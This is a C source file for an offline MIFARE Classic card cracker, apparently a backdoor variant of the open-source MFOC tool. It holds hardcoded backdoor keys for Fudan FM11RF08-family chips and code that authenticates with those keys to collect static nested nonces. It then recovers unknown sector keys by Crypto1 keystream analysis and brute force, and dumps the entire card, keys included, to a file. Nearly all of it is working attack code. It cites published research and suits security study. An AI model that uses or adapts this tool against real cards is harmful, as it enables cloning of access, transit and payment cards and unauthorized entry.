/*-
 * Mifare Classic Offline Cracker
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 * Contact: <mifare@nethemba.com>
 *
 * Porting to libnfc 1.3.3: Michal Boska <boska.michal@gmail.com>
 * Porting to libnfc 1.3.9 and upper: Romuald Conty <romuald@libnfc.org>
 *
 */

/*
 * This implementation was written based on information provided by the
 * following documents:
 *
 * http://eprint.iacr.org/2009/137.pdf
 * http://www.sos.cs.ru.nl/applications/rfid/2008-esorics.pdf
 * http://www.cosic.esat.kuleuven.be/rfidsec09/Papers/mifare_courtois_rfidsec09.pdf
 * http://www.cs.ru.nl/~petervr/papers/grvw_2009_pickpocket.pdf
 */

#define _XOPEN_SOURCE 1 // To enable getopt

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include "../config.h"

// NFC
#include <nfc/nfc.h>

// Crapto1
#include "crapto1.h"

// Internal
#include "mfoc.h"
#include "nfc-utils.h"
#include "staticnested.h"

#define MAX_SECTOR_CNT 40  // 4K 32x64b + 8*256b = 40
#define MAX_BLOCK_CNT 256
#define MAX_FRAME_LEN 264

#define MF_MODULATION \
    (nfc_modulation) { .nmt = NMT_ISO14443A, .nbr = NBR_106 }
#define SEC_TO_TRAILER(S) \
    ((S) < 32 ? ((S) * 4 + 3) : ((S) * 16 - 369))

#define KEY_BLK_SIZE 0x200


const uint64_t def_test_keys[] =
{
    0xFFFFFFFFFFFF, // Default key (first key used by program if no user defined key)
    0x000000000000, // Blank key
    0xA0A1A2A3A4A5, // NFCForum MAD key
    0xD3F7D3F7D3F7, // NFCForum content key
    0xB0B1B2B3B4B5,
    0x4D3A99C351DD,
    0x1A982C7E459A,
    0xAABBCCDDEEFF,
    0x714C5C886E97,
    0x587EE5F9350F,
    0xA0478CC39091,
    0x533CB6C723F6,
    0x8FD0A4F256E9
};

const uint64_t def_backdoor_keys[] =
{
    0xA396EFA4E24F, // FM11RF08S xx90
    0xA31667A8CEC1, // FM11RF08
    0x518B3354E760, // FM11RF32N 4K
    0x73B9836CF168  // Another 4K?
};

nfc_context *ctx = NULL;
nfc_device *pdi = NULL;
nfc_target *pnt = NULL;


void num_to_bytes(
    uint8_t *dest,
    uint64_t n,
    uint32_t len)
{
    while (len--)
    {
        dest[len] = (uint8_t) n;
        n >>= 8;
    }
}

uint64_t bytes_to_num(
    uint8_t *src,
    uint32_t len)
{
    uint64_t num = 0;

    while (len--)
    {
        num = (num << 8) | (*src);
        src++;
    }

    return num;
}

void mf_init(void)
{
    // Connect to the first NFC device
    nfc_init(&ctx);
    if (ctx == NULL)
    {
        fprintf(stderr, "Unable to init libnfc (malloc)\n");
        exit(EXIT_FAILURE);
    }

    pdi = nfc_open(ctx, NULL);
    if (pdi == NULL)
    {
        fprintf(stderr, "No NFC device found.\n");
        exit(EXIT_FAILURE);
    }

    pnt = malloc(sizeof(nfc_target));
    if (pnt == NULL)
    {
        fprintf(stderr, "Failed to allocate nfc_target\n");
        exit(EXIT_FAILURE);
    }
}

void mf_destroy(void)
{
    // Reap and exit
    free(pnt);
    nfc_close(pdi);
    nfc_exit(ctx);
}

void mf_configure(void)
{
    //  * - Crc is handled by the device (NP_HANDLE_CRC = true)
    //  * - Parity is handled the device (NP_HANDLE_PARITY = true)
    //  * - Cryto1 cipher is disabled (NP_ACTIVATE_CRYPTO1 = false)
    //  * - Easy framing is enabled (NP_EASY_FRAMING = true)
    //  * - Auto-switching in ISO14443-4 mode is enabled (NP_AUTO_ISO14443_4 = true)
    //  * - Invalid frames are not accepted (NP_ACCEPT_INVALID_FRAMES = false)
    //  * - Multiple frames are not accepted (NP_ACCEPT_MULTIPLE_FRAMES = false)
    //  * - 14443-A mode is activated (NP_FORCE_ISO14443_A = true)
    //  * - speed is set to 106 kbps (NP_FORCE_SPEED_106 = true)
    //  * - Let the device try forever to find a target (NP_INFINITE_SELECT = true)

    if (nfc_initiator_init(pdi) < 0)
    {
        nfc_perror(pdi, "nfc_initiator_init");
        exit(EXIT_FAILURE);
    }

    // Let the reader only try once to find a tag
    mf_device_set(NP_INFINITE_SELECT, false);

    // Disable ISO14443-4 switching in order to read devices that
    // emulate Mifare Classic with ISO14443-4 compliance.
    mf_device_set(NP_AUTO_ISO14443_4, false);
}

void mf_select_target(void)
{
    int tag_cnt = nfc_initiator_select_passive_target(pdi, MF_MODULATION, NULL, 0, pnt);
    if (tag_cnt == 0)
    {
        fprintf(stderr, "No tag found.\n");
        exit(EXIT_FAILURE);
    }
    if (tag_cnt < 0)
    {
        nfc_perror(pdi, "nfc_initiator_select_passive_target");
        exit(EXIT_FAILURE);
    }
}

void mf_device_set(
    nfc_property property,
    bool enable)
{
    if (nfc_device_set_property_bool(pdi, property, enable) < 0)
    {
        nfc_perror(pdi, "nfc_device_set_property_bool");
        exit(EXIT_FAILURE);
    }
}

bool mf_read(
    uint8_t blk,
    uint8_t *blk_p)
{
    uint8_t abt_cmd[2];
    uint8_t abt_res[MAX_FRAME_LEN];

    // Prepare MC_READ command
    abt_cmd[0] = MC_READ;
    abt_cmd[1] = blk;

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
    if (res > 0)
    {
        if (blk_p != NULL)
            memcpy(blk_p, abt_res, res);
        return true;
    }
    else if (res == NFC_ERFTRANS)
    {
        // Reselect tag
        mf_select_target();
        return false;
    }
    else
    {
        nfc_perror(pdi, "nfc_initiator_mifare_cmd: MC_READ");
        exit(EXIT_FAILURE);
    }
}

bool mf_auth(
    uint8_t cmd,
    uint8_t blk,
    uint64_t key,
    uint32_t uid)
{
    uint8_t abt_cmd[12];
    uint8_t abt_res[MAX_FRAME_LEN];

    // Prepare MC_AUTH command
    abt_cmd[0] = cmd;
    abt_cmd[1] = blk;
    num_to_bytes(abt_cmd + 2, key, 6);
    num_to_bytes(abt_cmd + 8, uid, 4);

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
    if (res >= 0)
        return true;
    else if (res == NFC_EMFCAUTHFAIL)
    {
        // Reselect tag
        mf_select_target();
        return false;
    }
    else
    {
        nfc_perror(pdi, "nfc_initiator_mifare_cmd: MC_AUTH");
        exit(EXIT_FAILURE);
    }
}

bool mf_nested_auth(
    uint8_t cmd,
    uint8_t cmd_enc,
    uint8_t blk,
    uint64_t key,
    uint32_t uid,
    uint32_t *nt_p,
    uint8_t *par_p,
    bool decrypt)
{
    // TODO: Set NP_HANDLE_PARITY and NP_HANDLE_CRC only once if possible
    uint8_t abt_cmd[8];
    uint8_t abt_res[MAX_FRAME_LEN];
    uint8_t abt_cmd_par[8];
    uint8_t abt_res_par[MAX_FRAME_LEN];

    // We need full control over the CRC
    mf_device_set(NP_HANDLE_CRC, false);

    // Use raw send/receive methods
    mf_device_set(NP_EASY_FRAMING, false);

    // Initiate authentication
    abt_cmd[0] = cmd;
    abt_cmd[1] = blk;
    iso14443a_crc_append(abt_cmd, 2);

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, 4, abt_res, sizeof(abt_res), 0);

    mf_device_set(NP_EASY_FRAMING, true);

    // Does it respond with Nt?
    if (res != 4)
    {
        // Return CRC control
        mf_device_set(NP_HANDLE_CRC, true);

        // Reselect tag
        mf_select_target();

        return false;
    }

    // Finally we want to send arbitrary parity bits
    mf_device_set(NP_HANDLE_PARITY, false);

    // Save the tag nonce (nt)
    uint32_t nt = bytes_to_num(abt_res, 4);

    struct Crypto1State pcs;

    // Init the cipher with key {0..47} bits
    crypto1_init(&pcs, key);
    // Load (plain) nt^uid into the cipher {48..79} bits
    crypto1_word(&pcs, nt ^ uid, 0);

    // Load in the reader nonce (Nr = 0)
    num_to_bytes(abt_cmd, 0x00, 4);

    // Skip 32 bits in the pseudo random generator
    nt = prng_successor(nt, 32);

    // Generate reader-answer from tag-nonce
    for (size_t i = 4; i < 8; i++)
    {
        nt = prng_successor(nt, 8);
        abt_cmd[i] = nt & 0xFF;
    }

    // Encrypt response
    for (size_t i = 0; i < 8; i++)
    {
        uint8_t b = abt_cmd[i];

        abt_cmd[i] = crypto1_byte(&pcs, 0x00, 0) ^ b;
        abt_cmd_par[i] = filter(pcs.odd) ^ oddparity(b);
    }

    // Transmit reader-answer
    res = nfc_initiator_transceive_bits(pdi, abt_cmd, 64, abt_cmd_par, abt_res, sizeof(abt_res), abt_res_par);

    // Decrypt the tag answer and verify that suc3(nt) is At
    if (res != 32 || (crypto1_word(&pcs, 0x00, 0) ^ bytes_to_num(abt_res, 4)) != prng_successor(nt, 32))
    {
        mf_device_set(NP_HANDLE_CRC, true);
        mf_device_set(NP_HANDLE_PARITY, true);

        mf_select_target();

        return false;
    }

    // nested auth
    abt_cmd[0] = cmd_enc;
    abt_cmd[1] = blk;
    iso14443a_crc_append(abt_cmd, 2);

    // Encryption of the Auth command, sending the Auth command
    for (size_t i = 0; i < 4; i++)
    {
        uint8_t b = abt_cmd[i];

        abt_cmd[i] = crypto1_byte(&pcs, 0x00, 0) ^ b;
        abt_cmd_par[i] = filter(pcs.odd) ^ oddparity(b);
    }

    res = nfc_initiator_transceive_bits(pdi, abt_cmd, 32, abt_cmd_par, abt_res, sizeof(abt_res), abt_res_par);
    if (res != 32)
    {
        nfc_perror(pdi, "Error while requesting encrypted tag-nonce");
        exit(EXIT_FAILURE);
    }

    // Save the encrypted nonce + last parity bit
    uint32_t nt_enc = bytes_to_num(abt_res, 4);
    uint8_t par_enc = abt_res_par[3];

    if (decrypt)
    {
        crypto1_init(&pcs, key);

        nt_enc ^= crypto1_word(&pcs, nt_enc ^ uid, 1);
        par_enc = oddparity(nt_enc & 0xFF);
    }

    if (nt_p != NULL)
        *nt_p = nt_enc;
    if (par_p != NULL)
        *par_p = par_enc;

    mf_device_set(NP_HANDLE_CRC, true);
    mf_device_set(NP_HANDLE_PARITY, true);

    mf_select_target();

    return true;
}

int main(
    int argc,
    char *const argv[])
{
    uint64_t *test_keys = NULL;
    size_t test_keys_len = 0;

    uint64_t *backdoor_keys = NULL;
    size_t backdoor_keys_len = 0;

    FILE *fp_out = NULL;

    #define PUSH_KEY(VAL, ARR, LEN)                                             \
        do {                                                                    \
            if (LEN % KEY_BLK_SIZE == 0)                                        \
            {                                                                   \
                ARR = realloc(ARR, (LEN + KEY_BLK_SIZE) * sizeof(uint64_t));    \
                if (ARR == NULL)                                                \
                {                                                               \
                    fprintf(stderr, "Cannot allocate memory for " #ARR "\n");   \
                    exit(EXIT_FAILURE);                                         \
                }                                                               \
            }                                                                   \
            ARR[LEN++] = VAL & 0xFFFFFFFFFFFF;                                  \
        } while (0)

    // Add default test keys
    for (size_t i = 0; i < sizeof(def_test_keys) / sizeof(uint64_t); i++)
        PUSH_KEY(def_test_keys[i], test_keys, test_keys_len);

    // Add default backdoor keys
    for (size_t i = 0; i < sizeof(def_backdoor_keys) / sizeof(uint64_t); i++)
        PUSH_KEY(def_backdoor_keys[i], backdoor_keys, backdoor_keys_len);

    for (;;)
    {
        int ch = getopt(argc, argv, "hf:g:o:");
        if (ch == -1)
            break;

        switch (ch)
        {
            case 'f':
            case 'g':
                FILE *fp_in = fopen(optarg, "r");
                if (fp_in == NULL)
                {
                    fprintf(stderr, "Cannot open keyfile: %s, exiting\n", optarg);
                    exit(EXIT_FAILURE);
                }

                char line[64];
                while (fgets(line, sizeof(line), fp_in) != NULL)
                {
                    uint64_t key = strtoull(line, NULL, 16);
                    if (key != 0x00)
                    {
                        if (ch == 'f')
                            PUSH_KEY(key, test_keys, test_keys_len);
                        else
                            PUSH_KEY(key, backdoor_keys, backdoor_keys_len);
                    }
                }

                fclose(fp_in);
                break;

            case 'o':
                fp_out = fopen(optarg, "wb");
                if (fp_out == NULL)
                {
                    fprintf(stderr, "Cannot open output file %s, exiting\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;

            case 'h':
            default:
                printf("Usage: mfoc-backdoor [-h] [-f file] [-g file] [-o output]\n");
                printf("  h     print this help and exit\n");
                printf("  f     parses a file of keys to test in addition to the default test keys\n");
                printf("  g     parses a file of keys to test in addition to the default backdoor keys\n");
                printf("  o     file in which the card contents will be written\n");
                exit(EXIT_SUCCESS);
        }
    }

    // Register cleanup
    atexit(mf_destroy);

    // Initialize reader/tag structures
    mf_init();
    mf_configure();

    // Select tag
    mf_select_target();

    // Test if a compatible MIFARE tag is used
    if ((pnt->nti.nai.btSak & 0x08) == 0 && pnt->nti.nai.btSak != 0x01)
    {
        fprintf(stderr, "Only Mifare Classic is supported\n");
        exit(EXIT_FAILURE);
    }

    print_nfc_target(pnt, true);
    printf("\n\n");

    // Save uid
    uint32_t auth_uid = bytes_to_num(pnt->nti.nai.abtUid + pnt->nti.nai.szUidLen - 4, 4);

    uint64_t backdoor_key = ~0;

    // Test all backdoor keys
    for (size_t i = 0; i < backdoor_keys_len; i++)
    {
        printf("\rTry to authenticate card with backdoor keys... (%10zu / %zu)  ", i + 1, backdoor_keys_len);
        fflush(stdout);

        // Advanced verification at sector 0
        if (mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_keys[i], auth_uid, NULL, NULL, false))
        {
            backdoor_key = backdoor_keys[i];
            break;
        }
    }

    printf("\n\n");
    free(backdoor_keys);

    if (backdoor_key != ~0)
        printf("Found backdoor key: %012llX\n\n", backdoor_key);
    else
    {
        printf("Card does not have a known backdoor... try mfoc (hardnested)\n");
        exit(EXIT_SUCCESS);
    }

    // Check if the card has static nonces
    // At this point it is established the card supports CRYPTO1 / backdoor command
    for (uint32_t nt, nt_prev, i = 0; i < 4; i++)
    {
        mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_key, auth_uid, &nt, NULL, false);

        if (i > 0 && nt != nt_prev)
        {
            printf("Card does not have static nested nonces... try mfoc (hardnested)\n");
            exit(EXIT_SUCCESS);
        }

        nt_prev = nt;
    }

    size_t num_sectors, num_blocks;
    struct mf_key keys_a[MAX_SECTOR_CNT] = { 0 },
                  keys_b[MAX_SECTOR_CNT] = { 0 };

    // Save nonces for both key A/B
    // Probe all sectors to choose num_sectors
    for (size_t s = 0; s < MAX_SECTOR_CNT; s++)
    {
        printf("\rCollecting card nonces using the backdoor command... (sector %02d)  ", s);
        fflush(stdout);

        if (!mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, SEC_TO_TRAILER(s), backdoor_key,
                            auth_uid, &keys_a[s].nt, &keys_a[s].par, true) ||
            !mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, SEC_TO_TRAILER(s), backdoor_key,
                            auth_uid, &keys_a[s].nt_enc, &keys_a[s].par_enc, false) ||
            !mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, SEC_TO_TRAILER(s), backdoor_key,
                            auth_uid, &keys_b[s].nt, &keys_b[s].par, true) ||
            !mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, SEC_TO_TRAILER(s), backdoor_key,
                            auth_uid, &keys_b[s].nt_enc, &keys_b[s].par_enc, false))
        {
            num_sectors = s;
            num_blocks = SEC_TO_TRAILER(s - 1) + 1;
            break;
        }
    }

    printf("\n\n");

    printf("Sector | Nt A     | Nt B     |\n");
    printf("-------+----------+----------+\n");
    for (size_t s = 0; s < num_sectors; s++)
        printf("%02d     | %08llX | %08llX |\n", s, keys_a[s].nt, keys_b[s].nt);
    printf("\n");

    // Test all keys provided
    // todo - check for duplicates in found/unknown key list (do we care? will not be huge overhead)
    // todo - make code more modular! :)
    for (size_t i = 0; i < test_keys_len; i++)
    {
        printf("\rTry to authenticate to all sectors with test keys... (%10zu / %zu)  ", i + 1, test_keys_len);
        fflush(stdout);

        // Iterate over every sector
        for (size_t s = 0; s < num_sectors; s++)
        {
            // Filter keys based on collected keystream
            if (!keys_a[s].found &&
                sen_check_key(keys_a[s].nt, keys_a[s].nt_enc, keys_a[s].par, keys_a[s].par_enc,
                              auth_uid, test_keys[i]))
            {
                if (mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), test_keys[i], auth_uid))
                {
                    keys_a[s].found = true;
                    keys_a[s].key = test_keys[i];

                    if (!keys_b[s].found)
                    {
                        uint8_t block[16];

                        // Although KeyA can never be directly read from the data sector, KeyB can, so
                        // if we need KeyB for this sector, it should be revealed by a data read with KeyA
                        if (mf_read(SEC_TO_TRAILER(s), block))
                        {
                            uint64_t read_key = bytes_to_num(block + 10, 6);

                            if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), read_key, auth_uid))
                            {
                                keys_b[s].found = true;
                                keys_b[s].key = read_key;
                            }
                        }
                    }
                }
            }

            if (!keys_b[s].found &&
                sen_check_key(keys_b[s].nt, keys_b[s].nt_enc, keys_b[s].par, keys_b[s].par_enc,
                              auth_uid, test_keys[i]))
            {
                if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), test_keys[i], auth_uid))
                {
                    keys_b[s].found = true;
                    keys_b[s].key = test_keys[i];
                }
            }
        }
    }

    printf("\n\n");
    free(test_keys);

    printf("Sector | Key A        | Key B        |\n");
    printf("-------+--------------+--------------+\n");
    for (size_t s = 0; s < num_sectors; s++)
    {
        printf("%02d     | ", s);
        printf(keys_a[s].found ? "%012llX | " : "             | ", keys_a[s].key);
        printf(keys_b[s].found ? "%012llX | " : "             | ", keys_b[s].key);
        printf("\n");
    }
    printf("\n");

    // Now recover keys
    printf("Try to recover all unknown keys...\n\n");

    // Initialize table for reversing LFSR states
    init_lfsr16_table();

    // LUT for comparing states
    uint8_t lfsr16_common[0x10000];

    for (size_t s = 0; s < num_sectors; s++)
    {
        uint64_t *candidates_a, *candidates_b;
        size_t candidates_a_len, candidates_b_len;

        // Clear LUT
        memset(lfsr16_common, 0, sizeof(lfsr16_common));

        if (!keys_a[s].found)
        {
            // Generate candidates
            if (!sen_recover_keys(keys_a[s].nt, keys_a[s].nt_enc, keys_a[s].par, keys_a[s].par_enc,
                                  auth_uid, &candidates_a, &candidates_a_len))
            {
                fprintf(stderr, "Failed to allocate memory for candidates_a\n");
                exit(EXIT_FAILURE);
            }

            // Filter keys based on nonce generation in Fudan tags
            for (size_t i = 0; i < candidates_a_len; i++)
            {
                uint16_t seed = compute_seednt16_nt32(keys_a[s].nt, candidates_a[i]);
                lfsr16_common[seed] |= 0b10;

                // Store in top 16 bits
                candidates_a[i] |= (uint64_t) seed << 48;
            }
        }

        if (!keys_b[s].found)
        {
            if (!sen_recover_keys(keys_b[s].nt, keys_b[s].nt_enc, keys_b[s].par, keys_b[s].par_enc,
                                  auth_uid, &candidates_b, &candidates_b_len))
            {
                fprintf(stderr, "Failed to allocate memory for candidates_b\n");
                exit(EXIT_FAILURE);
            }

            for (size_t i = 0; i < candidates_b_len; i++)
            {
                uint16_t seed = compute_seednt16_nt32(keys_b[s].nt, candidates_b[i]);
                lfsr16_common[seed] |= 0b01;

                candidates_b[i] |= (uint64_t) seed << 48;
            }
        }

        if (!keys_a[s].found)
        {
            for (size_t l = 0, i = 0; i < candidates_a_len; i++)
            {
                uint64_t key = candidates_a[i];
                uint16_t seed = key >> 48;

                if (keys_b[s].found ?
                    seed == compute_seednt16_nt32(keys_b[s].nt, keys_b[s].key) :
                    lfsr16_common[seed] & 0b01)
                {
                    candidates_a[i] = candidates_a[l];
                    candidates_a[l++] = key;
                }
            }

            // Bruteforce
            for (size_t i = 0; i < candidates_a_len; i++)
            {
                printf("\rBruteforcing sector %02d, key A (%10zu / %zu)  ", s, i + 1, candidates_a_len);
                fflush(stdout);

                if (mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), candidates_a[i], auth_uid))
                {
                    keys_a[s].found = true;
                    keys_a[s].key = candidates_a[i] & 0xFFFFFFFFFFFF;

                    if (!keys_b[s].found)
                    {
                        uint8_t block[16];

                        // Try again to read key B
                        if (mf_read(SEC_TO_TRAILER(s), block))
                        {
                            uint64_t read_key = bytes_to_num(block + 10, 6);

                            if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), read_key, auth_uid))
                            {
                                keys_b[s].found = true;
                                keys_b[s].key = read_key;
                            }
                        }
                    }

                    break;
                }
            }

            printf("Done\n");
            free(candidates_a);
        }

        if (!keys_b[s].found)
        {
            for (size_t l = 0, i = 0; i < candidates_b_len; i++)
            {
                uint64_t key = candidates_b[i];
                uint16_t seed = key >> 48;

                if (keys_a[s].found ?
                    seed == compute_seednt16_nt32(keys_a[s].nt, keys_a[s].key) :
                    lfsr16_common[seed] & 0b10)
                {
                    candidates_b[i] = candidates_b[l];
                    candidates_b[l++] = key;
                }
            }

            for (size_t i = 0; i < candidates_b_len; i++)
            {
                printf("\rBruteforcing sector %02d, key B (%10zu / %zu)  ", s, i + 1, candidates_b_len);
                fflush(stdout);

                if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), candidates_b[i], auth_uid))
                {
                    keys_b[s].found = true;
                    keys_b[s].key = candidates_b[i] & 0xFFFFFFFFFFFF;
                    break;
                }
            }

            printf("Done\n");
            free(candidates_b);
        }
    }

    printf("\n");

    printf("Sector | Key A        | Key B        |\n");
    printf("-------+--------------+--------------+\n");
    for (size_t s = 0; s < num_sectors; s++)
    {
        printf("%02d     | ", s);
        printf(keys_a[s].found ? "%012llX | " : "             | ", keys_a[s].key);
        printf(keys_b[s].found ? "%012llX | " : "             | ", keys_b[s].key);
        printf("\n");
    }
    printf("\n");

    uint8_t blocks[MAX_BLOCK_CNT][16] = { 0 };

    // Dump card data
    for (size_t i = 0, s = 0; s < num_sectors; s++)
    {
        printf("\rDumping all card contents... (sector %02d)  ", s);
        fflush(stdout);

        // Authenticate sector
        if (keys_a[s].found)
            mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), keys_a[s].key, auth_uid);
        else if (keys_b[s].found)
            mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), keys_b[s].key, auth_uid);
        else
            i = SEC_TO_TRAILER(s) + 1;

        // Read all blocks in sector
        for (; i <= SEC_TO_TRAILER(s); i++)
            mf_read(i, blocks[i]);

        // Copy keys into trailer blocks
        num_to_bytes(blocks[SEC_TO_TRAILER(s)], keys_a[s].key, 6);
        num_to_bytes(blocks[SEC_TO_TRAILER(s)] + 10, keys_b[s].key, 6);
    }

    printf("\n\n");

    printf("Block | Data (Unknown = 00)              |\n");
    printf("------+----------------------------------+\n");
    for (size_t i = 0; i < num_blocks; i++)
    {
        printf("%03d   | ", i);
        for (size_t u = 0; u < 16; u++)
            printf("%02X", blocks[i][u]);
        printf(" |\n");
    }
    printf("\n");

    if (fp_out != NULL)
    {
        size_t res = fwrite(blocks, sizeof(uint8_t), num_blocks * 16, fp_out);
        if (res != num_blocks * 16)
        {
            fprintf(stderr, "Error, cannot write data back to file\n");
            exit(EXIT_FAILURE);
        }
        fclose(fp_out);
    }

    exit(EXIT_SUCCESS);
}